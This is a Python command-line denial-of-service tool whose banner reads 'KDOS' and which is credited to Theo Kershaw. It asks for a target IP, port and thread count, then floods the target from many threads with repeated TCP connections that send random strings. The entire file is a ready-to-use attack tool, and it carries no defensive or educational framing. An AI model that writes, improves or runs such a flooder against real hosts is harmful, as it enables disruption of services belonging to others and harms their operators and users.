#!/usr/bin/env python3
import socket
import random
import string
import threading
import os

"""
*********************************
      Made by Theo Kershaw
*********************************
"""

r = "\033[31m"
b = "\033[34m"
w = "\033[37m"

os.system('cls' if os.name == 'nt' else 'clear')

print(f'''{r}
                                                     ██ ▄█▀▓█████▄  ▒█████    ██████ 
                                                     ██▄█▒ ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
                                                    ▓███▄░ ░██   █▌▒██░  ██▒░ ▓██▄   
                                                    ▓██ █▄ ░▓█▄   ▌▒██   ██░  ▒   ██▒
                                                    ▒██▒ █▄░▒████▓ ░ ████▓▒░▒██████▒▒
                                                    ▒ ▒▒ ▓▒ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
                                                    ░ ░▒ ▒░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
                                                    ░ ░░ ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
                                                    ░  ░      ░        ░ ░        ░  
                                                            ░                        
        \n''')

host = input(f'{b}Enter IP: ')
port = int(input(f'{b}Enter port: '))
max_threads = int(input(f'{b}Enter max threads: '))

def id_generator(size=12):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(size))

def main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            msg = id_generator()
            s.send(msg.encode())
            print(f'{b}[*] {w}Sent: {r}{msg}{w}')
            s.close()
        except ConnectionRefusedError:
            print(f'{r}[-] {w}Unable to reach host...')
        except ConnectionError:
            print(f'{r}[-] {w}Connection error...')

threads = []
for _ in range(max_threads):
    thread = threading.Thread(target=main, daemon=True)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

"""
*********************************
      Made by Theo Kershaw
*********************************
"""
